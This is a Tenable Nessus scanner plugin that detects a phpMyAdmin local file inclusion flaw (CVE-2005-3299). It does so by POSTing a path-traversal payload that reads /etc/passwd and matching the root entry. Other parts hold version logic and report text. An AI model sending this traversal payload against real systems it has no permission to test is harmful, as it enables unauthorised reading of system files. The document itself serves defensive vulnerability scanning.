#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(19950);
  script_version("1.21");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2005-3299");
  script_bugtraq_id(15053);

  script_name(english:"phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
local file inclusion flaw.");
  script_set_attribute(attribute:"description", value:
"The version of phpMyAdmin installed on the remote host allows
attackers to read and possibly execute code from arbitrary files on
the local host because of its failure to sanitize the parameter
'subform' before using it in the 'libraries/grab_globals.lib.php'
script.");
  script_set_attribute(attribute:"see_also", value:"http://securityreason.com/achievement_securityalert/24");
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-4");
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin 2.6.4-pl2 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/10/10");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/10/11");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_require_keys("www/phpMyAdmin", "www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80, php: 1);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # Make sure an affected script exists.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it does...
  if (egrep(pattern:'<link rel="stylesheet" [^>]+/phpmyadmin\\.css\\.php', string:res)) {
    # Try to exploit the flaw to read a file.
    postdata = string(
      "usesubform[1]=1&",
      "subform[1][redirect]=../../../../../../../../../etc/passwd"
    );
    r = http_send_recv3(method:"POST", item: string(dir, "/index.php?plugin=", SCRIPT_NAME), version: 11,
      exit_on_fail: 1, content_type:"application/x-www-form-urlencoded",
      data: postdata, port:port);
    res = r[2];
    # There's a problem if there's an entry for root.
    if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
      if (report_verbosity > 0) {
        res = data_protection::redact_etc_passwd(output:res);
        security_warning(port: port, extra: res);
      }
      else
        security_warning(port:port);

      exit(0);
    }
  }
  # Check the version number in case open_basedir is restricting access.
  if ( ( report_paranoia > 1 ) && (ver =~ "^([01]\.|2\.([0-5]\.|6\.([0-3]|4($|.*pl1))))") ) {
     security_warning(port:port, extra: "
***** Nessus has determined the vulnerability exists on the remote
***** host simply by looking at the version number of phpMyAdmin
***** installed there.
");
  }
}
